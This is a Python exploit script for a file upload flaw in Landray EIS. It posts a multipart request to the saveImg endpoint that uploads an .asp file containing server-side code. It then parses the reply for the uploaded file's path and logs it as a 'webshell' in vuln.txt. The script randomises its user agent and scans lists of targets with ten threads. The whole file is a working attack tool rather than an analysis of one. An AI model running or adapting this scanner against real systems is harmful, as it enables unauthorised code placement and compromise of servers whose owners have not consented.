import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random

#蓝凌EIS
#icon_hash="953405444"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

proxies={'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'}

def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

#poc
def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	vuln_url ='{}://{}/eis/service/api.aspx?action=saveImg'.format(url[0],url[1])
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'multipart/form-data; boundary=----test'
	}
	data='''------test
Content-Disposition: form-data; name="file"filename="apirule.asp"
Content-Type: text/html

123<% response.write("test123")%>
------test--'''
	
	try:
		res = requests.post(vuln_url,headers=headers,data=data,timeout=15,verify=False)
		if res.status_code == 200 and 'files/edit' in res.text:
			rsp = re.findall(r'files(.*?)asp', res.text, re.DOTALL)[0]
			webshell = '{}/files{}asp'.format(url1,rsp)
			print('\033[32m[+]Upload successful : {}\033[0m'.format(webshell))
			wirte_targets(webshell,"vuln.txt")
			#else:
			#	print("\033[34m[-]{} Upload failed. {}\033[0m".format(webshell,res.status_code))
		else:
			print("\033[34m[-]{} not vulnerable. {}\033[0m".format(url1,res.status_code))
	except Exception as e:
		print("\033[31m[!]{} is timeout\033[0m".format(url1))

#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':

	print("\n蓝凌EIS upload scan by when\n")

	arg=ArgumentParser(description='check_vulnerabilities By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	print('[*]任务开始...')
	if url != None and filename == None:
		check_vuln(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时{}'.format(end-start))
